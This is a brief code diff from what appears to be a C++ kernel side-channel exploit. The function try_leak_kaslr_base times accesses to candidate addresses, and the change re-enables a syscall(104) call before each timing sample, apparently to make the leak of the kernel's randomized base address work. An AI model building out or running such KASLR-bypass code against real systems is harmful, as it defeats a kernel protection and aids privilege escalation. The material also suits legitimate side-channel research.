@@ -157,7 +157,7 @@ std::pair<std::optional<uint64_t>, std::vector<uint64_t>> try_leak_kaslr_base(in
     for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
-            // syscall(104);
+            syscall(104);
             uint64_t timing = sidechannel(addr);
             all_timings[slot].push_back(timing);
         }
